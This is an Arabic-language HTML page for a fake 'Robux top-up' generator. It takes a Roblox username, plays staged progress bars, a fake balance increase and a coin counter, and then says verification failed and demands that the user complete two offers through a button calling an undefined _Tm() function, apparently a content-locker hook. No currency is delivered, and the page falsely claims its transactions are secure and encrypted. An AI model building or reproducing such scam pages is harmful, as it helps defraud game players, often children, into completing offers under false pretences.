<body>
    <div class="container">
        <header class="header">
            <img src="https://i.imgur.com/Ndy0UU0.png" alt="Roblox Logo" class="logo">
            <h1 class="title">شحن Robux</h1>
            <div class="balance-container">
                <span class="balance-text"> رصيدك :  <span id="current-balance">0</span></span>
                <img src="https://i.imgur.com/n1kAetz.png" alt="Robux Icon" class="robux-icon">
            </div>
        </header>
        <main class="main-content">
            <section class="form-section" id="main-form">
                <div class="input-group">
                    <label for="roblox-username"><i class="fas fa-user"></i> اسم المستخدم في Roblox</label>
                    <input type="text" id="roblox-username" placeholder="أدخل اسم المستخدم هنا">
                </div>
                <div class="input-group">
                    <label><i class="fas fa-gamepad"></i> اختر المنصة</label>
                    <div class="options-grid platform-options">
                        <button class="option-btn" data-platform="pc"><i class="fas fa-desktop"></i> كمبيوتر</button>
                        <button class="option-btn" data-platform="mobile"><i class="fas fa-mobile-alt"></i> موبايل</button>
                        <button class="option-btn" data-platform="console"><i class="fas fa-gamepad"></i> كونسول</button>
                    </div>
                </div>
                <div class="input-group">
                    <label><i class="fas fa-coins"></i> اختر كمية الـ Robux</label>
                    <div class="options-grid robux-options">
                        <button class="option-btn" data-robux="400">400</button>
                        <button class="option-btn" data-robux="800">800</button>
                        <button class="option-btn" data-robux="1700">1.700</button>
                        <button class="option-btn" data-robux="9500">3.500</button>
                        <button class="option-btn" data-robux="5000">5.000</button>
                        <button class="option-btn" data-robux="7500">7.500</button>
                    </div>
                </div>
                <button class="submit-btn" id="submit-btn">شحن Robux الآن</button>
                <div class="security-info"><i class="fas fa-lock"></i> جميع المعاملات آمنة ومشفرة</div>
            </section>
            <section class="form-section" id="processing-screen">
                <h2>جاري معالجة طلبك...</h2>
                <div class="progress-container">
                    <div class="progress-bar" id="progress-bar"></div>
                </div>
                <div class="step" id="step-1"><i class="fas fa-search"></i> البحث عن الحساب: <span id="user-id"></span></div>
                <div class="step" id="step-2"><i class="fas fa-check-circle"></i> تم العثور على الحساب</div>
                <div class="step" id="step-3"><i class="fas fa-paper-plane"></i> جاري إرسال الـ Robux</div>
                <div class="step" id="step-4"><i class="fas fa-shield-alt"></i> عملية التحقق</div>
            </section>
            <section class="form-section" id="robux-counter-screen">
                <h2>جاري تحضير الـ Robux</h2>
                <div class="robux-counter-container">
                    <img src="https://i.imgur.com/YTaEuId.png" alt="Robux Coins" class="robux-image">
                    <div class="robux-counter" id="robux-counter">0</div>
                </div>
            </section>
            <section class="form-section" id="verification-screen">
                <h2>تعذر إتمام العملية</h2>
                <p>يرجى إكمال عملية التحقق للحصول على الـ Robux</p>
                <p>تعذر عملية التحقق. يجب إكمال الخطوة التالية: الضغط على زر إتمام عملية التحقق وإكمال المهام. يجب إكمال عرضين لبدء إرسال الـ Robux إلى حسابك في Roblox.</p>
                <button onclick="_Tm()"id="verify-btn">تحقق الآن</button>
            </section>
        </main>
    </div>
    <script>
        const robloxUsernameInput = document.getElementById('roblox-username');
        const submitBtn = document.getElementById('submit-btn');
        const mainForm = document.getElementById('main-form');
        const processingScreen = document.getElementById('processing-screen');
        const robuxCounterScreen = document.getElementById('robux-counter-screen');
        const verificationScreen = document.getElementById('verification-screen');
        const progressBar = document.getElementById('progress-bar');
        const userId = document.getElementById('user-id');
        const verifyBtn = document.getElementById('verify-btn');
        const robuxCounter = document.getElementById('robux-counter');
        const currentBalance = document.getElementById('current-balance');

        let selectedPlatform = '';
        let selectedRobux = 0;

        const coinSound = new Audio('https://example.com/cash-register-sound.mp3');

        document.querySelectorAll('.platform-options .option-btn').forEach(button => {
            button.addEventListener('click', function() {
                selectedPlatform = this.getAttribute('data-platform');
                document.querySelectorAll('.platform-options .option-btn').forEach(btn => {
                    btn.classList.remove('selected');
                });
                this.classList.add('selected');
            });
        });

        document.querySelectorAll('.robux-options .option-btn').forEach(button => {
            button.addEventListener('click', function() {
                selectedRobux = parseInt(this.getAttribute('data-robux'));
                document.querySelectorAll('.robux-options .option-btn').forEach(btn => {
                    btn.classList.remove('selected');
                });
                this.classList.add('selected');
            });
        });

        submitBtn.addEventListener('click', function() {
            if (robloxUsernameInput.value && selectedPlatform && selectedRobux) {
                animateRobuxToBalance();
                startProcessing();
            } else {
                alert('يرجى ملء جميع الحقول المطلوبة.');
            }
        });

        function animateRobuxToBalance() {
            const flyingRobux = document.createElement('div');
            flyingRobux.textContent = '+' + selectedRobux;
            flyingRobux.className = 'flying-robux';
            flyingRobux.style.left = `${Math.random() * window.innerWidth}px`;
            flyingRobux.style.top = `${window.innerHeight}px`;
            document.body.appendChild(flyingRobux);

            setTimeout(() => {
                document.body.removeChild(flyingRobux);
                updateBalance();
            }, 1500);
        }

        function updateBalance() {
            const currentBalanceValue = parseInt(currentBalance.textContent.replace(/,/g, ''));
            const newBalance = currentBalanceValue + selectedRobux;
            currentBalance.textContent = newBalance.toLocaleString();
            coinSound.play();
        }

        function startProcessing() {
            mainForm.style.display = 'none';
            processingScreen.style.display = 'block';
            userId.textContent = robloxUsernameInput.value;

            let progress = 0;
            const steps = document.querySelectorAll('.step');
            const interval = setInterval(() => {
                progress += 5;
                progressBar.style.width = `${progress}%`;

                if (progress >= 25 && !steps[0].classList.contains('active')) {
                    steps[0].classList.add('active');
                }
                if (progress >= 50 && !steps[1].classList.contains('active')) {
                    steps[1].classList.add('active');
                }
                if (progress >= 75 && !steps[2].classList.contains('active')) {
                    steps[2].classList.add('active');
                }
                if (progress >= 100) {
                    steps[3].classList.add('active');
                    clearInterval(interval);
                    setTimeout(showRobuxCounter, 1000);
                }
            }, 200);
        }

        function showRobuxCounter() {
            processingScreen.style.display = 'none';
            robuxCounterScreen.style.display = 'block';

            let count = 0;
            const interval = setInterval(() => {
                count += Math.floor(selectedRobux / 100);
                if (count > selectedRobux) {
                    count = selectedRobux;
                }
                robuxCounter.textContent = count.toLocaleString();
                coinSound.play();

                if (count >= selectedRobux) {
                    clearInterval(interval);
                    setTimeout(showVerification, 1000);
                }
            }, 50);
        }

        function showVerification() {
            robuxCounterScreen.style.display = 'none';
            verificationScreen.style.display = 'block';
        }

      
    </script>
</body>
